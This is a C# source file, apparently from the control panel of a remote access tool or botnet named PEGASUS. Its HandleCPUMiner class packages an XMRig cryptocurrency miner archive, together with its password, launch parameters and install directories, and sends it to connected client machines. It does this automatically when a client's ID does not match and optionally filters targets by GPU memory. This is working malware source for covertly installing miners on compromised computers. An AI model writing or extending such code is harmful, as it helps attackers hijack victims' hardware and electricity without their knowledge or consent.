namespace Server.Handle_Packet
{
    using PEGASUS.Cryptografhsh;
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System.IO;
    using System.Threading;
    using Settings = PEGASUS.Settings;

    /// <summary>
    /// Defines the <see cref="HandleCPUMiner" />.
    /// </summary>
    internal class HandleCPUMiner
    {
        /// <summary>
        /// The ByteSend.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        private void ByteSend(Clients client)
        {
            MsgPack packet = new MsgPack();
            packet.ForcePathObject("Packet").AsString = "StartCPU";
            packet.ForcePathObject("XMRPROC").AsString = PEGASUS.Properties.Settings.Default.cpu_Proc; //miner name in the archive without extension
            packet.ForcePathObject("ZIPPASSXMRIG").AsString = PEGASUS.Properties.Settings.Default.cpu_zipPassword; // Archive password
            packet.ForcePathObject("PARMXMRIG").AsString = PEGASUS.Properties.Settings.Default.cpu_Parametrs; // Launch parameters
            packet.ForcePathObject("WORKDIRXMRIG").AsString = PEGASUS.Properties.Settings.Default.cpu_workDir; // Launch parameters
            packet.ForcePathObject("SYSWORKDIR").AsString = PEGASUS.Properties.Settings.Default.cpu_sysDir;
            packet.ForcePathObject("DELAY").AsString = PEGASUS.Properties.Settings.Default.cpu_delay.ToString();
            packet.ForcePathObject("IDPARAMETERS").AsString = PEGASUS.Properties.Settings.Default.cpu_idParameters.ToString();
            packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(PEGASUS.Properties.Settings.Default.cpuFile)));
            ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
        }

        /// <summary>
        /// The GetCPU.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public void GetCPU(Clients client, MsgPack unpack_msgpack)
        {
            lock (Settings.LockListviewClients)

                try
                {
                    int ramgpu = (int)unpack_msgpack.ForcePathObject("GPURAM").AsInteger;

                    /*    if (unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString == "0" || unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString == "1")
                        {
                            // Если ID 0 то не запрашиваем авто-старт
                            client.LV.SubItems[11].BackColor = Color.IndianRed;
                        }

                        */

                    // Работает если труе то воркает авто-минер
                    if (PEGASUS.Properties.Settings.Default.autoStart_cpu == true)
                    {
                        if (PEGASUS.Properties.Settings.Default.cpu_idParameters == unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString)
                        {
                            // ID Совпадают
                            return;
                        }
                        else
                        {
                            if (PEGASUS.Properties.Settings.Default.notInstallCPUgpu6 == true)
                            {
                                try
                                {
                                    if (ramgpu < 6)
                                    {
                                        ByteSend(client);
                                    }
                                }
                                catch
                                {
                                    if (unpack_msgpack.ForcePathObject("GPURAM").AsString == "NA")
                                    {
                                        ByteSend(client);
                                    }
                                }
                            }
                            else
                            {
                                ByteSend(client);
                            }
                        }
                    }
                }
                catch
                {
                    ByteSend(client);
                }
        }
    }
}
